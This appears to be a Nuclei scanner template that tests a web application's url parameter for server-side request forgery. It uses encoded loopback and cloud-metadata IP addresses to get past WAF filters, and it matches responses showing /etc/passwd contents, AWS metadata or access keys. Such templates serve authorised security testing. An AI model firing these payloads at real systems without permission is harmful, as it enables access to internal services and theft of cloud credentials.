# gap: ssrf-waf-bypass-ip-encoding
id: ssrf-waf-bypass-ip-encoding

info:
  name: SSRF via IP Encoding WAF Bypass
  author: TyrusRC
  severity: high
  description: |
    Tests SSRF with alternative IP representations that bypass WAF rules
    blocking 127.0.0.1 and 169.254.169.254. Includes hexadecimal, decimal,
    octal, IPv6, and DNS rebinding representations.
  reference:
    - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
  tags: custom,ssrf,waf-bypass,ip-encoding

http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://0x7f000001/"
      - "{{BaseURL}}/?url=http://2130706433/"
      - "{{BaseURL}}/?url=http://[::1]/"
      - "{{BaseURL}}/?url=http://0177.0.0.1/"
      - "{{BaseURL}}/?url=http://0x7f.0x0.0x0.0x1/"
      - "{{BaseURL}}/?url=http://127.1/"
      - "{{BaseURL}}/?url=http://0000::1/"
      - "{{BaseURL}}/?url=http://0xA9FEA9FE/"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "root:x:0:0:"
          - "ami-id"
          - "instance-id"
          - "AccessKeyId"
          - "redis_version"
          - "Server:"
          - "<!DOCTYPE"
          - "phpinfo()"
        condition: or

      - type: word
        negative: true
        words:
          - "blocked"
          - "not allowed"
          - "denied"
          - "invalid url"
